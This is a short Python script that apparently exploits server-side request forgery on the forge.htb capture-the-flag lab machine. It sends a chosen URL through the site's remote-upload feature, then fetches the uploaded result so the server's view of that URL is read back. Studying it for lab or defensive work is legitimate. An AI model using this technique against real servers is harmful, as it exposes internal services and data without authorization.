import re
import requests
import sys


def main():
    url = sys.argv[1]

    r = requests.post('http://forge.htb/upload', {'url': url, 'remote': 1})

    if 'http://forge.htb' not in r.text:
        print(re.findall(r'<strong>(.*?)</strong>', r.text)[0])
        exit()

    upload_url = re.findall(r'<a href="(http://forge\.htb/.*?)">', r.text)[0]

    r = requests.get(upload_url)
    print(r.text)


if __name__ == '__main__':
    main()
